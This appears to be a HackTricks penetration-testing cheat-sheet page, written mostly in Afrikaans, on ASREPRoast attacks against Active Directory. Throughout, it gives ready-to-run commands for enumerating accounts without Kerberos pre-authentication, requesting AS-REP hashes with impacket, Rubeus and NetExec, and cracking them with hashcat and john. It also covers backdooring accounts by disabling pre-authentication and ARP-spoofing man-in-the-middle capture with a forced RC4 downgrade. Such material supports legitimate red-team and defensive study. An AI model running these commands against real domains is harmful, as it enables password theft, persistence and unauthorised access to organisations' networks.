# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is 'n sekuriteitsaanval wat gebruikers uitbuit wat nie die **Kerberos pre-authentication required attribute** het nie. In wese laat hierdie kwesbaarheid aanvallers toe om verifikasie vir 'n gebruiker vanaf die Domain Controller (DC) aan te vra sonder om die gebruiker se wagwoord te nodig. Die DC reageer dan met 'n boodskap wat met die gebruiker se wagwoord-afgeleide sleutel geïnkripteer is, wat aanvallers offline kan probeer crack om die gebruiker se wagwoord te ontdek.

Die hoofvereistes vir hierdie aanval is:

- **Lack of Kerberos pre-authentication**: Teikengebruikers mag nie hierdie sekuriteitsfunksie geaktiveer hê nie.
- **Connection to the Domain Controller (DC)**: Aanvallers moet toegang tot die DC hê om versoeke te stuur en geïnkripteerde boodskappe te ontvang.
- **Optional domain account**: Om 'n domain account te hê laat aanvallers toe om meer doeltreffend kwesbare gebruikers deur LDAP queries te identifiseer. Sonder so 'n account moet aanvallers usernames raai.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Versoek AS_REP-boodskap
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus versoek **RC4** by verstek, so Event ID **4768** wys gewoonlik **preauth type 0** en **ticket encryption type 0x17**. As jy **`/aes`** byvoeg (of RC4 is gedeaktiveer vir die teiken), verwag **AES etypes** in plaas daarvan.

#### Quick one-liners (Linux)

- Enumarate moontlike teikens eers (bv. uit gelek build paths) met Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast 'n hele username list sonder geldige creds met NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- As jy wel creds het, laat NetExec LDAP query en versoek elke roastable account vir jou: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- As die output begin met **`$krb5asrep$23$`**, crack dit met Hashcat **`-m 18200`**. As dit begin met **`$krb5asrep$17$`** of **`$krb5asrep$18$`**, verkies John **`--format=krb5asrep`**.

### Cracking

Moenie aanvaar elke AS-REP roast is RC4 nie. Moderne tooling kan **RC4** (`$krb5asrep$23$`) of **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) teruggee, afhangende van die aangevraagde/onderhandelende enctype. **`hashcat -m 18200`** is vir **etype 23**, terwyl **John** `krb5asrep` direk hanteer vir **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Volharding

Dwing **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll**-toestemmings het (of toestemmings om properties te skryf):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sonder credentials

'n Aanvaller kan 'n man-in-the-middle-posisie gebruik om AS-REP-pakkette vas te vang terwyl hulle oor die netwerk beweeg, sonder om te steun op Kerberos pre-authentication wat gedeaktiveer is. Dit werk dus vir alle users op die VLAN.\
As jy die verwante no-credential-truuk wil hê wat 'n **service ticket** in plaas van 'n **TGT** van 'n no-preauth principal teruggee, sien [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) laat ons toe om dit te doen. `relay` mode is die interessante een offensief omdat dit **RC4** kan forseer wanneer die client steeds **etype 23** adverteer; `listen` bly passief en vang net wat ook al die client/DC onderhandel het.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
